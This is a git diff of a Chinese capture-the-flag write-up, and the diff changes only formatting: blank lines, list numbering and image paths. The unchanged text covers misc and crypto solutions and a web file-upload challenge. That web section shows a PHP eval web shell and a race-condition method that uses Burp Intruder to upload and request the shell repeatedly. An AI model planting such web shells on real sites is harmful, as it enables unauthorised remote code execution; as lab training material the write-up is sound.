@@ -36,8 +36,6 @@ c9376fd461e00f3e1899a4435839691b7aed3de8
 
 ![image-20231231160841600](image/image-20231231160841600.png)
 
-
-
 最后答案为弗朗索瓦丝·多比涅
 
 第四问
@@ -50,8 +48,6 @@ c9376fd461e00f3e1899a4435839691b7aed3de8
 
 ![image-20231231161307088](image/image-20231231161307088.png)
 
-
-
 ![image-20231231161349654](image/image-20231231161349654.png)
 
 所以最后答案为:|
@@ -59,8 +55,6 @@ c9376fd461e00f3e1899a4435839691b7aed3de8
 所有答案上传后得到flag
 
 ![image-20231231161436083](image/image-20231231161436083.png)
-
-
 
 ### 蟹皇堡秘方
 
@@ -91,8 +85,6 @@ c9376fd461e00f3e1899a4435839691b7aed3de8
 加密是to，解密就是from，直接替换
 
 ![image-20231231162335845](image/image-20231231162335845.png)
-
-
 
 然后有几个特殊的加密
 
@@ -189,8 +181,6 @@ GNP=PNG
 
 得到flag
 
-
-
 ## Crypto
 
 ### 签到
@@ -233,19 +223,18 @@ GNP=PNG
 
 ![image-20231231170323051](image/image-20231231170323051.png)
 
-
 这段代码的作用是对一个字符串进行加密，然后输出加密后的结果。让我们一步步来分析：
 
 1. `flag = ""`: 定义了一个空字符串 `flag`，这将是要加密的原始字符串。
-2. `ascii_values = [ord(char) - 5 for char in flag]`: 创建了一个列表 `ascii_values`，其中包含了字符串 `flag` 中每个字符的ASCII值减去5的结果。
-3. `for i in range(len(ascii_values)):`: 开始一个循环，遍历 `ascii_values` 列表中的每个元素。
-4. `if (i + 1) % 2 != 0:`: 如果当前元素的索引是奇数（基于1的索引），则执行以下操作：
+1. `ascii_values = [ord(char) - 5 for char in flag]`: 创建了一个列表 `ascii_values`，其中包含了字符串 `flag` 中每个字符的ASCII值减去5的结果。
+1. `for i in range(len(ascii_values)):`: 开始一个循环，遍历 `ascii_values` 列表中的每个元素。
+1. `if (i + 1) % 2 != 0:`: 如果当前元素的索引是奇数（基于1的索引），则执行以下操作：
    - `ascii_values[i] -= 2`: 将当前元素的值减去2。
    - `else:`: 如果当前元素的索引是偶数，则执行以下操作：
    - `ascii_values[i] += 2`: 将当前元素的值加上2。
-5. `ascii_values[i] += 5`: 无论索引是奇数还是偶数，最后都将当前元素的值加上5。
-6. `en_flag = ''.join(chr(value) for value in ascii_values)`: 将修改后的 `ascii_values` 转换为字符，形成一个新的字符串 `en_flag`。
-7. `print(en_flag)`: 打印加密后的字符串 `en_flag`。
+1. `ascii_values[i] += 5`: 无论索引是奇数还是偶数，最后都将当前元素的值加上5。
+1. `en_flag = ''.join(chr(value) for value in ascii_values)`: 将修改后的 `ascii_values` 转换为字符，形成一个新的字符串 `en_flag`。
+1. `print(en_flag)`: 打印加密后的字符串 `en_flag`。
 
 根据给定的代码，加密后的字符串是：`{ccdd329`;2:3/bc45+92d7//817+g2:`857_}ecjh`
 
@@ -275,19 +264,17 @@ print(flag)
 
 解法2：gpt秒了
 
-
-
 ## WEB
 
 ### 上传？上传！
 
 打开实例，看出来文件上传
 
-![image-20231231110345814](image\image-20231231110345814.png)
+![image-20231231110345814](image/image-20231231110345814.png)
 
 先随意上传一个图片码
 
-![image-20231231110515156](image\image-20231231110515156.png)
+![image-20231231110515156](image/image-20231231110515156.png)
 
 发现先提示上传成功，然后后台对上的文件进行分析判断，判断上传的文件不符合要求然后被删除
 
@@ -310,41 +297,39 @@ a.php里面构建，
 <?php @eval($_POST["mqy"]);成功 ?>
 ```
 
-
-
 这里我推荐用bp自带的浏览器，就不用设置代理了
 
-![image-20231231111540172](image\image-20231231111540172.png)
+![image-20231231111540172](image/image-20231231111540172.png)
 
 上传进行抓包
 
-![image-20231231113130926](image\image-20231231113130926.png)
+![image-20231231113130926](image/image-20231231113130926.png)
 
 将其发送到intruder
 
 再不受影响的位置添加一个数字1
 
-![image-20231231113148229](image\image-20231231113148229.png)
+![image-20231231113148229](image/image-20231231113148229.png)
 
 然后进行爆破上传
 
-![image-20231231113207088](image\image-20231231113207088.png)
+![image-20231231113207088](image/image-20231231113207088.png)
 
 目的是为了一直发送上传请求
 
 再去访问a.php，也进行抓包
 
-![image-20231231113321237](image\image-20231231113321237.png)
+![image-20231231113321237](image/image-20231231113321237.png)
 
 同样发送到intruder
 
 再不受影响的位置添加一个数字1
 
-![image-20231231113438687](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231231113438687.png)
+![image-20231231113438687](image/image-20231231113438687.jpg)
 
 同样进行设置，一直访问，
 
-![image-20231231113614939](image\image-20231231113614939.png)
+![image-20231231113614939](image/image-20231231113614939.png)
 
 很好理解，就是一直上传一直访问，一定有能成功访问的，一旦访问，就能生成网页b
 
